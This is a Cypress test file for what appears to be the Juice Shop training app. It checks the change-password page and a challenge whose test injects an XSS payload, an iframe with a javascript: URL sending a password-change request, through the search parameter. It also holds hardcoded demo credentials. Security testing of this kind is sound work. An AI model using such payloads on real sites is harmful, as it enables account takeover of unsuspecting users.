describe('/#/privacy-security/change-password', () => {
  describe('as Morty', () => {
    beforeEach(() => {
      cy.login({
        email: 'morty',
        password: 'focusOnScienceMorty!focusOnScience'
      })
      cy.visit('/#/privacy-security/change-password')
    })

    it('should be able to change password', () => {
      cy.get('#currentPassword').focus().type('focusOnScienceMorty!focusOnScience')
      cy.get('#newPassword').focus().type('GonorrheaCantSeeUs!')
      cy.get('#newPasswordRepeat').focus().type('GonorrheaCantSeeUs!')
      cy.get('#changeButton').click()

      cy.get('.confirmation').should('not.be.hidden')
    })
  })

  describe('challenge "changePasswordBenderChallenge"', () => {
    it('should detect the XSS-powered attempt to change password without passing current password and keep the password unchanged', () => {
      cy.login({
        email: 'bender',
        password: 'OhG0dPlease1nsertLiquor!'
      })
      const payload = "<iframe src=\"javascript:xmlhttp = new XMLHttpRequest(); xmlhttp.open('GET', 'http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic'); xmlhttp.send();\">"
      cy.visit('/#/search?q=' + encodeURIComponent(payload))
      cy.wait(2000)

      cy.expectChallengeSolved({ challenge: "Change Bender's Password" })

      cy.login({ email: 'bender', password: 'OhG0dPlease1nsertLiquor!' })
      cy.url().should('match', /\/search/)
    })
  })
})
